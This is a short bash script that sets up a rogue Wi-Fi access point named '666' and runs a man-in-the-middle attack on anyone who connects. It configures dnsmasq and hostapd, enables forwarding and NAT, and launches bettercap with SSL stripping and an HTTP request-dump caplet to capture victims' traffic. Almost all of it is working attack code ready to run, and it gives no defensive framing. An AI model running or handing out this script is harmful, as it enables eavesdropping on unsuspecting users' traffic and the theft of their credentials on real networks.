#!/bin/bash
# Author: DroidKali
# Description: This script function is one click to create a Evil-AP and MITM it.
# Version: v0.1

MONITOR_DEVICE=wlan0
OUTPUT_DEVICE=eth0

cat <<EOF > dnsmasq.conf
log-facility=/var/log/dnsmasq.log
dhcp-range=192.168.5.1,192.168.5.250,12h
dhcp-option=3,192.168.5.1
dhcp-option=6,192.168.5.1
server=114.114.114.114
log-queries
log-dhcp
EOF

cat <<EOF > hostapd.conf
driver=nl80211
ssid=666
hw_mode=g
channel=6
logger_syslog=-1
logger_syslog_level=2
EOF

cat <<EOF > net-sniffer.cap
set gateway.address 192.168.5.1
net.probe on
set http.proxy.sslstrip true
set https.proxy.sslstrip true
set http.proxy.script http-req-dump.js
set https.proxy.script http-req-dump.js
net.sniff on
http.proxy on
https.proxy on
EOF

# Catch ctrl c so we can exit cleanly
trap ctrl_c INT
function ctrl_c(){
    echo Killing processes...
    killall dnsmasq
    killall hostapd
}

ifconfig $MONITOR_DEVICE 192.168.5.1/24 up
dnsmasq -C dnsmasq.conf -i $MONITOR_DEVICE
sysctl -w net.ipv4.ip_forward=1
iptables -P FORWARD ACCEPT
iptables --table nat -A POSTROUTING -o $OUTPUT_DEVICE -j MASQUERADE
hostapd ./hostapd.conf -i $MONITOR_DEVICE -B
cp /usr/share/bettercap/caplets/http-req-dump/http-req-dump.js .
bettercap -iface $MONITOR_DEVICE -caplet net-sniffer.cap
echo Killing processes...
killall dnsmasq hostapd
rm -rf hostapd.conf dnsmasq.conf http-req-dump.js net-sniffer.cap
